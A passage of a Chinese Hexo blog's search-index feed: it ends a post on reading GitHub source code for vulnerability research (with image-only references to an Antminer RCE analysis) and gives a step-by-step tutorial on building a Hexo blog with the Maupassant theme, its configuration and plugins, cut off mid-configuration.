这里告诉大家样本在哪儿可以下载,重点是触发的命令是什么,有了这个触发命令之后,我们也可以去照猫画虎拿到AFL 里去跑Fuzzing 啦,美滋滋</p><h2 id="在Github-上读代码"><a href="#在Github-上读代码" class="headerlink" title="在Github 上读代码"></a>在Github 上读代码</h2><p>  一般我都是先在Github 上阅读代码,然后再下载代码到本地Source Insight 继续读.我们有两种方式在Github 上开始阅读</p><h3 id="根据文件夹来阅读"><a href="#根据文件夹来阅读" class="headerlink" title="根据文件夹来阅读"></a>根据文件夹来阅读</h3><p>  简单地来说:<strong>关注文件/文件夹的名字</strong></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/dir_php.png" alt="dir_php"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/dir_antminer.png" alt="dir_antmine"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/file_redis.png" alt="file_redis"></p><p>  多翻一下目录和文件,总会遇到你感兴趣的一个地方来读</p><h3 id="根据敏感函数来阅读"><a href="#根据敏感函数来阅读" class="headerlink" title="根据敏感函数来阅读"></a>根据敏感函数来阅读</h3><p>  善用Github 的搜索功能,它能够帮你搜索代码或者其他信息</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search_function.png" alt="github_search_function"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/github_search_function1.png" alt="github_search_function1"></p><p>  找到了一个感兴趣的地方开始阅读代码之后,Github 的搜素功能可以帮助你向上回溯代码</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/save_command.png" alt="save_command"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/save_command_find.png" alt="save_command_find"></p><p><img src="/2018/10/26/利用Github辅助漏洞分析/save_command_find_in_browser.png" alt="save_command_find_in_browse"></p><p>  在网页和普通编辑器阅读源码记得要多使用<code>Ctrl + F</code> ,它能够帮你快速定位当前代码文件的函数定位</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/ctrl_f_find.png" alt="ctrl_f_find"></p><h2 id="Git-Clone"><a href="#Git-Clone" class="headerlink" title="Git Clone"></a>Git Clone</h2><p>  这个就不多介绍了,下载代码到本地</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>  去年挖到一个蚂蚁矿机的远程代码执行漏洞,发现这个问题是直接在Github 上读代码的找到的,附上源码分析.</p><p><img src="/2018/10/26/利用Github辅助漏洞分析/source.png" alt="source"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo 搭建个人博客</title>
      <link href="/2018/10/21/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/10/21/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>积淀的意义不言而喻，希望能借助这个精神世界的自留地，沉淀所思所学，见证自己一步步走过的历程。<br><a id="more"></a></p><h2 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00 准备工作"></a>0x00 准备工作</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> 是一个基于 Node.js 的静态博客框架，具有极速生成静态页面、支持Markdown、一键部署、插件丰富等优点。在使用 Hexo 之前，需要进行以下准备工作。</p><ul><li>安装 Node.js，用以生成静态页面</li><li>安装 Git，用以提交管理博客</li><li>注册 Github 账号，并开启 Github Pages 服务  </li><li>掌握 Markdown 语法，用以管理站点内容</li></ul><p>以上内容资料较为丰富，因此不再赘述，如有需求请自行 Google。</p><h2 id="0x01-Hexo"><a href="#0x01-Hexo" class="headerlink" title="0x01 Hexo"></a>0x01 Hexo</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><p>通过以下命令，一键安装 Hexo<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g</span><br></pre></td></tr></table></figure></p><p>待安装完成后，创建用以存放 hexo 文件的目录，并初始化<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line"><span class="built_in">cd</span> hexo</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure></p><p>初始化成功后，目录结构如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">└── themes</span><br><span class="line"></span><br><span class="line">3 directories, 2 files</span><br></pre></td></tr></table></figure></p><h3 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2. 常用命令"></a>2. 常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server 开启hexo服务器</span><br><span class="line">$ hexo s</span><br><span class="line">$ hexo s --draft 显示草稿</span><br><span class="line"></span><br><span class="line">$ hexo new <span class="string">"name"</span> 新建文章</span><br><span class="line">$ hexo new draft <span class="string">"name"</span> 新建草稿</span><br><span class="line">$ hexo publish <span class="string">"name"</span> 发布草稿</span><br><span class="line"></span><br><span class="line">$ hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public)</span><br><span class="line"></span><br><span class="line">$ hexo generate 生成静态页面</span><br><span class="line">$ hexo g</span><br><span class="line"></span><br><span class="line">$ hexo deploy 部署博客到Github</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><h3 id="3-Hexo-配置"><a href="#3-Hexo-配置" class="headerlink" title="3. Hexo 配置"></a>3. Hexo 配置</h3><p>通过<code>/_config.yml</code>文件可对 Hexo 进行配置，官方文档中有详细介绍，不再赘述，详情可参考<a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">配置</a>。</p><h3 id="4-添加文章摘要"><a href="#4-添加文章摘要" class="headerlink" title="4. 添加文章摘要"></a>4. 添加文章摘要</h3><p>设置文章摘要有两种方法：</p><ul><li>在 Front-matter 中指定 description，如：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">title: Hello World</span><br><span class="line">date: 2013-11-22 17:11:54</span><br><span class="line">description: 你对本页的描述</span><br><span class="line">```  </span><br><span class="line">* 在正文使用 `&lt;!--more--&gt;` 作为摘要的结束标记</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">以上是摘要  </span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">以下是剩下的全文</span><br></pre></td></tr></table></figure><h3 id="5-自定义-404-、about-页面"><a href="#5-自定义-404-、about-页面" class="headerlink" title="5. 自定义 404 、about 页面"></a>5. 自定义 404 、about 页面</h3><ul><li>在 <code>hexo/source</code> 目录下创建 <code>404.html</code> 文件 或者 <code>404.md</code> 文件，以 404.html 为例接入<a href="http://www.qq.com/404/" target="_blank" rel="noopener">腾讯404公益广告</a>。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">layout: false</span><br><span class="line">title: "404"</span><br><span class="line">---</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">homePageUrl</span>=<span class="string">"http://&lt;your home page&gt;"</span> <span class="attr">homePageName</span>=<span class="string">"回到首页"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>在 <code>hexo/source/about/</code> 目录下创建 <code>index.md</code>文件，添加内容如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">---</span><br><span class="line">Coming soon ~</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"><span class="comment">### 6. 创建分类及标签  </span></span><br><span class="line">6.1 创建“分类”选项</span><br><span class="line">打开命令行，进入博客所在目录。执行以下命令</span><br><span class="line">```bash</span><br><span class="line">$ hexo new page NewCategories</span><br></pre></td></tr></table></figure><p>成功后提示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  Created: ~/Documents/blog/<span class="built_in">source</span>/NewCategories/index.md</span><br></pre></td></tr></table></figure></p><p>生成的<code>index.md</code>内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2018-10-20 13:47:40</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>向文件中添加<code>type: &quot;categories&quot;</code>，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2018-10-20 13:47:40</span><br><span class="line"><span class="built_in">type</span>: <span class="string">"categories"</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>打开需要添加分类的文章，为其添加categories属性。下方的<code>categories: web前端</code>表示添加这篇文章到“web前端”这个分类。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: jQuery对表单的操作及更多应用</span><br><span class="line">date: 2018-10-20 13:47:40</span><br><span class="line">categories:</span><br><span class="line">- web前端</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><p>6.2 创建“标签”选项<br>打开命令行，进入博客所在文件夹。执行命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page NewTags</span><br></pre></td></tr></table></figure></p><p>成功后会提示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  Created: ~/Documents/blog/<span class="built_in">source</span>/NewTags/index.md</span><br></pre></td></tr></table></figure></p><p>打开<code>index.md</code>文件，内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2017-05-27 14:22:08</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>添加<code>type: &quot;tags&quot;</code>至<code>index.md</code>中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2017-05-27 13:47:40</span><br><span class="line"><span class="built_in">type</span>: <span class="string">"tags"</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>打开需要添加标签的文章，为其添加tags属性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: jQuery对表单的操作及更多应用</span><br><span class="line">date: 2017-05-26 12:12:57</span><br><span class="line">categories:</span><br><span class="line">- web前端</span><br><span class="line">tags:</span><br><span class="line">- jQuery</span><br><span class="line">- 表格</span><br><span class="line">- 表单验证</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>至此，成功给文章添加标签，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><p>修改<code>scaffolds/post.md</code>模板文件，在 Front-matter 区域添加<code>tages:</code>、<code>categories:</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories:</span><br><span class="line">tags:</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>之后执行<code>hexo new 文章名</code>命令生成的文件，将会自动添加“分类”与“标签”。</p><h3 id="7-SEO优化"><a href="#7-SEO优化" class="headerlink" title="7. SEO优化"></a>7. SEO优化</h3><p>Hexo 站点已基本搭建完成。但是如果仅仅搭建完毕是无法通过搜索引擎查询到的，若想要加入搜索引擎收录，需进行 SEO 优化。<br>7.1 添加搜索引擎收录<br>分别在 <a href="http://zhanzhang.baidu.com/site/index" target="_blank" rel="noopener">百度站长工具</a> 和 <a href="https://www.google.com/webmasters/tools/home?hl=zh-CN" target="_blank" rel="noopener">Google 站长工具</a> 中对站点进行验证。</p><p>选择<code>文件验证</code>的方式进行验证，把下载的文件放在 <code>source</code> 目录下，并对文件内容进行编辑，在文件首部加入如下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">layout: <span class="literal">false</span></span><br><span class="line">sitemap: <span class="literal">false</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>这样就可以防止 Hexo 在生成博客网站时在验证文件里添加额外的内容，导致验证失败。<br>也可以在博客的配置文件里加入如下的配置来防止这些文件被渲染：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">skip_render:</span><br><span class="line"> - baidu_verify*.html</span><br><span class="line"> - google*.html</span><br></pre></td></tr></table></figure></p><p>7.2 添加robots.txt<br>在/source/下新建robots.txt：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /</span><br><span class="line">Allow: /archives/</span><br><span class="line">Allow: /about/</span><br><span class="line">Allow: /categories/</span><br><span class="line">Allow: /donate/</span><br><span class="line">Allow: /2017/</span><br><span class="line">Allow: /<span class="built_in">history</span>/</span><br><span class="line">Allow: /message/</span><br><span class="line">Allow: /page/</span><br><span class="line">Allow: /tags/</span><br><span class="line"></span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /fancybox/</span><br><span class="line"></span><br><span class="line">Sitemap: https://domain/sitemap.xml</span><br><span class="line">Sitemap: https://domain/baidusitemap.xml</span><br></pre></td></tr></table></figure></p><p>7.3 提交 sitemaps<br>利用插件生成sitemap（详见下文），待站点验证成功后便可以选择用 sitemap 的方式自动提交链接。<br>提交完成后可以通过 site:your-blog-site 验证站点是否被百度、Google 收录。 一般需要几天的时间才能保证被搜索引擎收录。</p><h2 id="0x02-Maupassant"><a href="#0x02-Maupassant" class="headerlink" title="0x02 Maupassant"></a>0x02 Maupassant</h2><p>Hexo官网提供了丰富的 <a href="https://hexo.io/themes/" target="_blank" rel="noopener">Themes</a>，选定心仪的主题之后，可以参照主题的文档进行安装，之后修改<code>/_conifg.yml</code>进行配置，本站选用了Maupassant。<br><img src="https://www.haomwei.com/images/maupassant.jpg" alt="主题效果">  </p><h3 id="1-Maupassant-安装"><a href="#1-Maupassant-安装" class="headerlink" title="1. Maupassant 安装"></a>1. Maupassant 安装</h3><p>安装主题和渲染器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/tufu9441/maupassant-hexo.git themes/maupassant</span><br><span class="line">$ npm install hexo-renderer-pug --save</span><br><span class="line">$ npm install hexo-renderer-sass --save</span><br></pre></td></tr></table></figure></p><p>编辑Hexo目录下的 <code>_config.yml</code>，将<code>theme</code>的值改为<code>maupassant</code>。</p><p><strong>注：安装<code>npm install hexo-renderer-sass</code>时报错，切换至<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝NPM镜像</a>安装即可。</strong></p><h3 id="2-Maupassant配置"><a href="#2-Maupassant配置" class="headerlink" title="2. Maupassant配置"></a>2. Maupassant配置</h3><p>官方文档中有详细介绍，可参考<a href="https://www.haomwei.com/technology/maupassant-hexo.html" target="_blank" rel="noopener">中文介绍</a>。</p><h3 id="3-显示文章目录"><a href="#3-显示文章目录" class="headerlink" title="3. 显示文章目录"></a>3. 显示文章目录</h3><p>在文章的 <a href="https://hexo.io/docs/front-matter.html#Settings_&amp;_Their_Default_Values" target="_blank" rel="noopener">Front-matter</a> 中添加<code>toc: true</code>就可以让该篇文章显示目录，可以修改 <code>hexo/scaffolds/post.md</code> 模板文件，这样之后创建的文章默认都显示文章目录。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories:</span><br><span class="line">tags:</span><br><span class="line">toc: <span class="literal">true</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><h3 id="4-开启-canvas-nest-网页动态背景"><a href="#4-开启-canvas-nest-网页动态背景" class="headerlink" title="4. 开启 canvas-nest 网页动态背景"></a>4. 开启 canvas-nest 网页动态背景</h3><p>修改<code>/themes/maupassant/_config.yml</code>:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  color:</span> <span class="number">208</span><span class="string">,55,66</span> <span class="comment">## RGB value of the color</span></span><br><span class="line"><span class="attr">  opacity:</span> <span class="number">0.3</span> <span class="comment">## Transparency of lines</span></span><br><span class="line"><span class="attr">  zIndex:</span> <span class="bullet">-1</span> <span class="comment">## The z-index property of the background</span></span><br><span class="line"><span class="attr">  count:</span> <span class="number">99</span> <span class="comment">## Quantity of lines</span></span><br></pre></td></tr></table></figure></p><h3 id="5-设置导航栏menu"><a href="#5-设置导航栏menu" class="headerlink" title="5. 设置导航栏menu"></a>5. 设置导航栏menu</h3><p>修改<code>/themes/maupassant/_config.yml</code>:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">home</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-home</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">archive</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">archives/</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-archive</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">about</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">about/</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-user</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">history</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">history/</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-user</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">rss</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">atom.xml</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-rss</span></span><br></pre></td></tr></table></figure></p><h3 id="6-为导航添加相应的页面（时间轴等）"><a href="#6-为导航添加相应的页面（时间轴等）" class="headerlink" title="6. 为导航添加相应的页面（时间轴等）"></a>6. 为导航添加相应的页面（时间轴等）</h3><ul><li>在/source下新建与page名称对应的文件夹，然后在文件夹中建立<code>index.md</code>文件；</li><li>在<code>index.md</code>的<code>front-matter</code>中设置属性，若需要含有侧边栏的页面，添加<code>layout: page</code>；若需要单栏页面，就将layout设置为 <code>layout: single-column</code>；若不需要评论，需要加上<code>comments: false</code></li><li>若要显示时间轴，在index.md的front-matter中设置layout属性为<code>layout: timeline</code>，同时修改<code>/themes/maupassant/_config.yml</code>:  </li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">timeline:</span></span><br><span class="line"><span class="attr">  - num:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">    word:</span> <span class="number">2014</span><span class="string">/06/12-Start</span></span><br><span class="line"><span class="attr">  - num:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">    word:</span> <span class="number">2014</span><span class="string">/11/29-XXX</span></span><br><span class="line"><span class="attr">  - num:</span> <span class="number">3</span></span><br><span class="line"><span class="attr">    word:</span> <span class="number">2015</span><span class="string">/02/18-DDD</span></span><br><span class="line"><span class="attr">  - num:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">    word:</span> <span class="string">More</span></span><br></pre></td></tr></table></figure><p>/source/history/index.md：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">layout: timeline</span><br><span class="line">comments: <span class="literal">false</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><h2 id="0x03-常用插件"><a href="#0x03-常用插件" class="headerlink" title="0x03 常用插件"></a>0x03 常用插件</h2><h3 id="1-hexo-wordcount"><a href="#1-hexo-wordcount" class="headerlink" title="1. hexo-wordcount"></a>1. hexo-wordcount</h3><p>安装插件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-wordcount —save</span><br></pre></td></tr></table></figure></p><p>开启 Maupassant 主题中的 Word Count 功能：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">wordcount:</span> <span class="literal">true</span> <span class="comment">## If you want to display the word counter and the reading time expected to spend of each post please set the value to true, and you must have hexo-wordcount installed.</span></span><br></pre></td></tr></table></figure></p><h3 id="2-hexo-generator-search"><a href="#2-hexo-generator-search" class="headerlink" title="2. hexo-generator-search"></a>2. hexo-generator-search</h3><p>启用 Maupassant 本地搜索功能，安装<a href="https://github.com/PaicHyperionDev/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure></p><p>安装完成后，修改主题配置，显示本地搜索框<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">self_search:</span> <span class="literal">true</span> <span class="comment">## Use a jQuery-based local search engine, true/false.</span></span><br></pre></td></tr></table></figure></p><h3 id="3-hexo-asset-image"><a href="#3-hexo-asset-image" class="headerlink" title="3. hexo-asset-image"></a>3. hexo-asset-image</h3><p>hexo对本地图片的支持并不友好，如果按markdown的语法写部署之后页面的图片取不到，如果按hexo的写法在本地markdown编辑器中又不能识别，解决办法是使用 hexo-asset-image 插件。<br>首先安装插件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-asset-image —save</span><br></pre></td></tr></table></figure></p><p>然后修改 <code>_config.yml</code> 中 <code>post_asset_folder</code> 的值为 <code>true</code>，这样每次创建文章的时候会生成一个同名文件夹用于放资源文件，这样就可以使用markdown的语法来插入图片了。</p><h3 id="4-hero-generator-feed"><a href="#4-hero-generator-feed" class="headerlink" title="4. hero-generator-feed"></a>4. hero-generator-feed</h3><p>支持 RSS 订阅，安装 hexo-generator-feed<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure></p><p>修改 hexo 配置<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">feed:</span></span><br><span class="line"><span class="attr">    type:</span> <span class="string">atom</span></span><br><span class="line"><span class="attr">    path:</span> <span class="string">atom.xml</span></span><br><span class="line"><span class="attr">    limit:</span> <span class="number">5</span> <span class="comment">#在feed中出现的最大文章数（使用0或者false）来显示所有文章</span></span><br><span class="line"><span class="attr">    hub:</span></span><br><span class="line"><span class="attr">    content:</span></span><br></pre></td></tr></table></figure></p><p>修改主题配置<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">- page:</span> <span class="string">rss</span></span><br><span class="line"><span class="attr">  directory:</span> <span class="string">atom.xml</span></span><br><span class="line"><span class="attr">  icon:</span> <span class="string">fa-rss</span></span><br></pre></td></tr></table></figure></p><h3 id="5-生成站点地图"><a href="#5-生成站点地图" class="headerlink" title="5. 生成站点地图"></a>5. 生成站点地图</h3><p>通过站点地图生成插件生成sitemap，进行SEO优化。</p><ul><li>安装插件  </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure><ul><li>生成站点地图,修改<code>/_config.yml</code>文件，添加如下配置：</li></ul><pre><code class="yml"><span class="comment"># 自动生成sitemap</span><span class="attr">sitemap:</span><span class="attr">    path:</span> <span class="string">sitemap.xml</span><span 